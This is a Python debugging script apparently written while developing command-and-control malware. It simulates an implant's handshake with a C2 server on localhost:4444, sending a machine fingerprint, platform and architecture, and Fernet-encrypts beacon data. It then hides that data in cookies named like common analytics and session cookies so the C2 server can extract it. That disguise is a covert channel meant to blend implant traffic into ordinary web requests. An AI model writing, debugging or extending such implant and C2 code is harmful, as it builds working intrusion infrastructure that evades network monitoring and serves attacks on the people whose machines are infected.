#!/usr/bin/env python3
"""
Trace through extract_data_from_cookie logic
"""
import re
import base64
import urllib.parse

# Simulate what extract_data_from_cookie does
COOKIE_NAMES = [
    '_ga', '_gid', '_fbp', 'xsid', 'PHPSESSID', 
    'wordpress_', 'wp-settings-', 'sessionid', 'csrftoken',
    'AWSALB', 'remember_me', 'auth_token', 'session'
]

def simulate_extract_data_from_cookie(cookie_header):
    """Simulate the C2's extract_data_from_cookie function"""
    print(f"[DEBUG] Cookie header: {cookie_header[:100]}...")
    
    for name in COOKIE_NAMES:
        pattern = f'{name}=([^;]+)'
        match = re.search(pattern, cookie_header)
        if match:
            print(f"[DEBUG] Found cookie '{name}'")
            try:
                encoded = match.group(1)
                print(f"[DEBUG] Encoded value: {encoded[:50]}...")
                
                # URL decode
                decoded = urllib.parse.unquote(encoded)
                print(f"[DEBUG] URL decoded: {decoded[:50]}...")
                
                # Base64 decode
                result = base64.b64decode(decoded)
                print(f"[DEBUG] Base64 decoded: {len(result)} bytes")
                print(f"[DEBUG] First 20 bytes: {result[:20].hex()}")
                return result
            except Exception as e:
                print(f"[DEBUG] Error processing cookie '{name}': {e}")
                continue
    
    print("[DEBUG] No matching cookie found")
    return None

# Test with what our test sends
print("=== Testing extract_data_from_cookie logic ===")

# Create test data (same as our beacon test)
import json
import hashlib
from cryptography.fernet import Fernet

fingerprint = "527c0c57d2fc4447bd0135ee7bcf6a096841ec650c70a8cebb72c4b392aa1d73"
implant_id_hash = hashlib.md5(fingerprint.encode()).hexdigest()[:8]

# Simulate handshake to get a real session key
import requests
print("[DEBUG] Starting handshake...")
response = requests.post('http://localhost:4444/handshake', json={
    "fingerprint": fingerprint,
    "machine_id": fingerprint,
    "implant_id_hash": implant_id_hash,
    "platform": "linux",
    "arch": "x64"
}, timeout=5)

if response.status_code == 200:
    session_key_b64 = response.json().get('key')
    print(f"[DEBUG] Got real session key: {session_key_b64[:20]}...")
    
    # Encrypt beacon data
    f = Fernet(session_key_b64.encode())
    beacon_data = {'id': implant_id_hash, 'test': 'data'}
    encrypted = f.encrypt(json.dumps(beacon_data).encode())
    encoded_data = base64.b64encode(encrypted).decode()
    
    print(f"\n[DEBUG] Encrypted data base64: {encoded_data[:50]}...")
    print(f"[DEBUG] Full base64 length: {len(encoded_data)}")
    
    # Create cookie header (what requests would send)
    cookie_header = f'session={encoded_data}'
    
    # Test extraction
    print("\n[DEBUG] Testing extraction...")
    result = simulate_extract_data_from_cookie(cookie_header)
    
    if result:
        print(f"\n[DEBUG] Successfully extracted {len(result)} bytes")
        # Try to decrypt with Fernet
        try:
            decrypted = f.decrypt(result)
            print(f"[DEBUG] Fernet decryption successful!")
            print(f"[DEBUG] Decrypted: {decrypted.decode()}")
        except Exception as e:
            print(f"[DEBUG] Fernet decryption failed: {e}")
            print(f"[DEBUG] Error type: {type(e).__name__}")
    else:
        print("\n[DEBUG] Failed to extract data")
else:
    print(f"[DEBUG] Handshake failed: {response.status_code}")
    print(f"[DEBUG] Response: {response.text}")
